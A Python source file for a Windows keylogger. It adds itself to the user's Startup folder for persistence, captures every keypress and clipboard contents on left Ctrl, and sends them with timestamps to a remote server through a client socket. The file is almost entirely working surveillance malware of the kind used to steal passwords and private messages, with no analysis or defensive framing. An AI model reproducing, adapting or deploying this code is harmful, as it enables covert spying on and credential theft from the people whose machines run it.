from pynput import keyboard
from datetime import datetime
import getpass
import shutil
import os.path
import winshell
import win32com.client
import threading
import pyperclip
from client import ClientSocket
import socket

class KeyLogger:
    def __init__(self):
        self.user = getpass.getuser()
        self.startupDir = winshell.startup()
        self.oldPaste = ""
        self.client = ClientSocket()

    def create_shortcut(self):
        if os.path.isfile("main.exe"):
            path = os.path.join(self.startupDir, "main.lnk")
            target = r"main.exe"
            winshell.CreateShortcut(Path=path, Target=target)
        else:
            print("(!) .EXE file missing.")

    def check_startup(self):
        path = os.path.join(self.startupDir, "main.lnk")
        exist = os.path.isfile(path)
        return exist

    def enable_startup(self):
        if not self.check_startup():
            self.create_shortcut()

    def get_ip(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        return ip
        
    def set_ip(self):
        ip = self.get_ip()
        with open(".env", "w+") as f:
            f.write(f"SERVER_IP={ip}")

    def on_press(self, key):
        time = datetime.now().replace(microsecond=0)
        paste = pyperclip.paste()

        if key == keyboard.Key.ctrl_l:
            if paste != self.oldPaste:
                self.oldPaste = paste
                self.client.send_message(f"{time} | Paste - {paste}\n")
        else:
            self.client.send_message(f"{time} | Key - {key}\n")

    def key_listener(self):
        with keyboard.Listener(on_press=self.on_press) as kl:
            kl.join()

if __name__ == "__main__":
    Logger = KeyLogger()
    Logger.set_ip()
    threading.Thread(target=Logger.enable_startup())
    Logger.key_listener()
